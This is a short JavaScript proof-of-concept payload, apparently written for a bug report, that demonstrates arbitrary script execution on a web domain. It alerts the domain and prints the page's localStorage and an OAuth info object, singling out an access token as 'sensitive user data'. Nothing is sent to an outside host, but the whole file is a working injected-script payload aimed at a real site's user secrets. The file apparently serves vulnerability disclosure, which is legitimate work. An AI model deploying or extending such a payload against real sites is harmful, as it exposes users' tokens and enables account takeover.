
console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ");
console.log(">>>>>> Kharaone, PoC for arbitrary JS execution on " + document.domain);
console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
alert(document.domain);
console.log("Local Storage:");
console.log(localStorage);
console.log("Sensitive User Data (see gs_access_token):");
console.log(photoOrg.oauthInfo);
